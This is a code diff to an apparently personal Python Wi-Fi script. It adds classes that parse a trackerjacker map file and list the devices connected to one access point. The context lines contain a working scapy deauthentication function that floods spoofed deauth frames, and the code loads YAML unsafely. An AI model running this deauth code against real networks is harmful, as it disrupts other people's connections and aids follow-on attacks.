@@ -93,6 +93,22 @@ def deauth():
     pkt = RadioTap() / Dot11(addr1 = brdmac, addr2 = "A4:91:B1:8A:A4:46", addr3 = "A4:91:B1:8A:A4:46") / Dot11Deauth()
     sendp(pkt, iface=interface, count=10000, inter=.2)
 
+class AP:
+    def __init__(self, ssid, bssid):
+        self.ssid = ssid
+        self.bssid = bssid
+        self.connectedDevices = []
+
+    def addDevice(self, device):
+        self.connectedDevices.append(device)
+
+class Device:
+    def __init__(self, bssid, signal, vendor):
+        self.bssid = bssid
+        self.signal = signal
+        self.vendor = vendor
+
+
 if __name__ == "__main__":
     # checkFotRoot()
     # apDevice = chooseDevice()
@@ -101,12 +117,31 @@ if __name__ == "__main__":
     #os.system('trackerjacker -i ' + apDevice + ' --map')
     stream = open("wifi_map.yaml", 'r')
     docs = yaml.load_all(stream)
+    wifilist =[]
+
+    myAP = "Casa"
+
     for doc in docs:
-        for k, v in doc.items():
-            print(k, "->", v)
-        print("\n")
+        for name, v in doc.items():
+            if myAP == name:
+                # print(k, "->", v)
+                apSsid = name
+                other = v
+
+    for o, v in other.items():
+        apBssid = o
+        devices = v["devices"]
 
 
+    ap = AP(apSsid, apBssid)
 
+    for bssid, other in devices.items():
+        device = Device(bssid, other['signal'], other['vendor'])
+        ap.addDevice(device)
 
-
+    print(ap.ssid)
+    print(ap.bssid)
+    for device in ap.connectedDevices:
+        print(device.bssid)
+        print(device.signal)
+        print(device.vendor)
